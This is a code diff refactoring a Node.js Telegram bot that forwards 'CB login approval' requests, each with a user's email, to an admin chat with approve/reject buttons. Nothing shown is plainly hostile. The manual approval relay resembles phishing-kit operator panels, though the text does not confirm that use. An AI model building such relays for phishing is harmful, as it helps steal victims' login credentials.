@@ -3,7 +3,7 @@ import TelegramBot from "node-telegram-bot-api";
 import fetch from "node-fetch";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID; // your existing env variable
+const CHAT_ID = process.env.CHAT_ID; // admin chat
 const APP_URL = process.env.APP_URL;
 
 if (!BOT_TOKEN || !CHAT_ID || !APP_URL) {
@@ -12,12 +12,12 @@ if (!BOT_TOKEN || !CHAT_ID || !APP_URL) {
 }
 
 // Initialize bot
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+export const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // -----------------
-// CB Login approval
+// Send login approval message
 // -----------------
-export function sendLoginTelegram(email) {
+export async function sendLoginTelegram(email) {
   const options = {
     parse_mode: "Markdown",
     reply_markup: {
@@ -29,9 +29,8 @@ export function sendLoginTelegram(email) {
       ]
     }
   };
-
   const message = `*CB login approval*\n*Email:* ${email}`;
-  bot.sendMessage(CHAT_ID, message, options);
+  await bot.sendMessage(CHAT_ID, message, options);
 }
 
 // -----------------
@@ -52,13 +51,15 @@ bot.on("callback_query", async (query) => {
     // Answer callback query
     await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
 
-    // Update message in Telegram
-    await bot.editMessageText(`*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`, {
-      chat_id: query.message.chat.id,
-      message_id: query.message.message_id,
-      parse_mode: "Markdown"
-    });
-
+    // Update Telegram message
+    await bot.editMessageText(
+      `*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`,
+      {
+        chat_id: query.message.chat.id,
+        message_id: query.message.message_id,
+        parse_mode: "Markdown"
+      }
+    );
   } catch (err) {
     console.error("❌ Failed to handle callback:", err);
     bot.sendMessage(CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
